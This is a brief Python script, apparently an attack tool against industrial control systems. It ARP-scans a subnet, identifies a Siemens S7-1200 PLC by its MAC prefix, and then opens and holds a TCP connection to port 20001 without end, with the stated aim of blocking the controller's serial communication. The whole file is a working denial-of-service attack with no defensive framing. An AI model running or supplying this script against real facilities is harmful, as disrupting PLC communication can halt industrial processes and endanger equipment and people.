import socket
import scapy.all as scapy
import time

def find_plc_ip():
    """
    Scan the network using ARP requests to detect Siemens S7-1200 PLC.
    """
    print("[*] Scanning network to locate Siemens S7-1200 PLC...")

    # Define the network range (Adjust to match your subnet)
    ip_range = "10.0.0.0/24"

    # Send ARP request to all IPs in the network range
    arp_request = scapy.ARP(pdst=ip_range)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    for element in answered_list:
        ip_address = element[1].psrc
        mac_address = element[1].hwsrc

        # Siemens PLCs often have MACs that start with specific prefixes (e.g., 00:0E:8C)
        if mac_address.startswith("00:0E:8C"):
            print(f"[+] Siemens S7-1200 PLC found: IP {ip_address}, MAC {mac_address}")
            return ip_address

    print("[-] Siemens S7-1200 PLC not found.")
    return None

def block_serial_com(plc_ip, tcp_port=20001):
    """
    Blocks the serial COM access by opening and holding a TCP connection to the serial-to-Ethernet converter.
    """
    print(f"[*] Attempting to block serial communication on {plc_ip}:{tcp_port}...")

    try:
        # Create a socket to connect to the target IP and port
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((plc_ip, tcp_port))
        print(f"[+] Connection established to {plc_ip}:{tcp_port}, holding open...")

        # Hold the connection open indefinitely
        while True:
            time.sleep(10)
    
    except Exception as e:
        print(f"[-] Failed to connect: {e}")
    
    finally:
        sock.close()
        print("[*] Connection closed.")

if __name__ == "__main__":
    plc_ip = find_plc_ip()
    if plc_ip:
        block_serial_com(plc_ip)